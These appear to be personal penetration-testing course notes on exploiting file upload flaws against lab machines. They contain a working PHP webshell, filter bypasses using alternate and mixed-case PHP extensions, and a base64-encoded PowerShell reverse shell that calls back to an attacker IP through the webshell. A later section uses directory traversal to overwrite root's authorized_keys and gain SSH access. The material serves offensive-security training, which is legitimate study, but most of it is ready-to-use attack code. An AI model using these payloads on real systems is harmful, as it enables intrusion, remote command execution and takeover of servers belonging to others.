Three categories
- Vulns enabling us to upload files that are executable by the web app.
	- Ex:  upload a PHP script to a web server where PHP is enabled, and we can execute the script via the browser or curl
- Vulns that require us to combine the file upload mechanism w/ another vuln (like Directory Traversal)
	- Ex: Web app is vulnerable to Directory Traversal, we use the relative path in the file upload request to try and overwrite files like **authorized_keys** or combining file upload mechanisms w/ XXE or XSS attacks
	- Ex: Uploading an avatar to a profile w/ a SVG file type and embed XXE attack to display file contents or execute code
- Relies on user interaction
	- Ex: Discover an upload form for job applications, we can try to upload a CV in .docx format w/ malicious macros integrated.

Web apps using *Apache, Nginx*, or other dedicated web servers often run w/ specific users (ie: *www-data* on Linux)
Windows' IIS web server runs as a *Network Service* account - a passwordless built-in Windows identity w/ low privs.
- IIS v7.5+ have IIS Application Pool Identities - virtual accounts running web apps grouped by *application pools*
	- Each pool has its own pool identity, making it possible to set more precise perms for accounts running webapps

When using programming languages that include their own web server, admins & devs often deploy the webapp w/o any priv structures by running them as *root* or *Admin* to avoid permissions issues.
- Always verify whether we can leverage root or admin privs in a file upload vuln.

Always determine what happens when a file is uploaded twice!
- If indication that the file already exists, possible to brute force the contents of the web server
- If there's an error message displayed, possible leaked info valuable in determining programming language or technologies in use.

# Executable Files

If a web app is a CMS (Content Management System), we can often upload an avatar for our profile or create blog posts & web pages w/ attached files.
If the target is a company website, can often find upload mechanisms in career sections or company-specific use cases
- Target site belongs to a lawyer's office, there may be an upload mech for case files.
- Might not be obvious, so never skip the enumeration phase.


Abuse a file upload mech to achieve code execution & get a revshell

To start, (on lab machine), navigating to the site where we can upload a file/ pic/ etc, test to see what kinds of files are allowed.

Successfully uploading a file extension which wouldn't be expected informs us that the file upload mechanism isn't as restricted as it should be:
```bash
echo "this is a file upload test" > test.txt
```
![](file_upload_test.png)
- Note!  Successful uploads are shown to be uploaded to the "uploads" directory, so we can assume there's a directory named "uploads"

Given that, attempting to upload the **simple-backdoor.php** webshell shows us that while .txt files are allowed for a picture upload, PHP files, on the other hand are not
```php
# simple backdoor
<?php
if(isset($_REQUEST['cmd'])){
	echoÂ "<pre>";
	$cmd = ($_REQUEST['cmd']);
	system($cmd);
	echo "</pre>";
	die;
}
?>
```
![](file_upload_phptest.png)

As these are mixed results, we can't know how the upload filter is implemented.

Potential ways to bypass a filter:
- Use lesser-used PHP file extensions (older ones still supported for compatibility purposes)
	- **.phps**
	- **.php7**
- Change the characters in the file extension to upper case
	- **pHP**

Navigating to the uploads directory and executing the PHP code within our file, should net us results:
```bash
curl http://mountaindesserts.com/meteor/uploads/simple-backdoor.pHP?cmd=dir
	<pre> Volume in drive C has no label.
	 Volume Serial Number is E6C8-741F
	
	 Directory of C:\xampp\htdocs\meteor\uploads
	
	02/20/2024  02:00 PM    <DIR>          .
	05/03/2022  06:02 AM    <DIR>          ..
	05/03/2022  05:21 AM                 0 $sock)
	02/20/2024  02:00 PM               120 simple_backdoor.pHP
	               2 File(s)            120 bytes
	               2 Dir(s)   6,914,285,568 bytes free
	</pre>           
```


### Reverse shell on Windows host

**pwsh** will open a PowerShell prompt on Kali

Now to help make our PS one-liner successful, we'll need to base64 encode it.
```powershell
PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
exit

PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

PS> $EncodedText =[Convert]::ToBase64String($Bytes)

PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

PS> exit
```

We can then use the resulting encoded text and tack it on as the **cmd** for our simple-backdoor.pHP upload using **-enc**
```bash
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```


# Non-Executable Files

Regardless of whether an attacker can execute an uploaded file, flaws in file uploads can have severe consequences.

Spidering the new OSCP site shows no php file anymore - so assuming PHP isn't used within the web app...

Start up burp and test new site

- Upload test file again
![](file_upload_test.png)

- Send POST request to Repeater and adjust to see if possible to write file to outside of web root
![](upload_outsideWebRoot.png)
- While response shows us the output of the **../** sequence, we can't know if the relative path was used for placing the file.
	- Possible the filename could've merely been echoed and sanitized internally.

- Assuming it *did* work, however, we can attempt to overwrite file in an attempt to get system access
	- **NOTE:** Can brick a system, so exercise *extreme caution*

We can use this (again, assuming it works) to do things like overwrite the **authorized_keys** file in the home directory of root in order to gain access to the system via SSH
- Create an SSH keypair
```bash
#generate public/private rsa key pair
ssh-keygen                                              
	Generating public/private rsa key pair.
	Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileupload
	Enter passphrase (empty for no passphrase): 
	Enter same passphrase again: 
	Your identification has been saved in fileupload
	Your public key has been saved in fileupload.pub
	The key fingerprint is:
	SHA256:yixipYbEeWc+7Aby3jADXjq3v3a6hfJaHrR+tXiuAw0 kali@kali
	The key's randomart image is:
	+---[RSA 3072]----+
	|                 |
	|                 |
	|                 |
	|. .  E           |
	| = o.+o S        |
	|oo=+*+oo .       |
	|.+B*oO=.o .      |
	| ooo&++= o       |
	|  .+=@*.=.       |
	+----[SHA256]-----+


#save to new authorized_keys file that will replace root user's
cat fileupload.pub > authorized_keys
```

Now.   Make sure you turn Burp's Intercept ON before actually uploading the file!   This will allow us to modify the filename to include the directory traversal
![](file_upload_keys.png)
- Click Forward

```bash
# remove previously saved host key/ connection information
rm ~/.ssh/known_hosts

# attempt ssh connection to root user via created private ssh key
ssh -i fileupload -p 2222 root@mountaindesserts.com
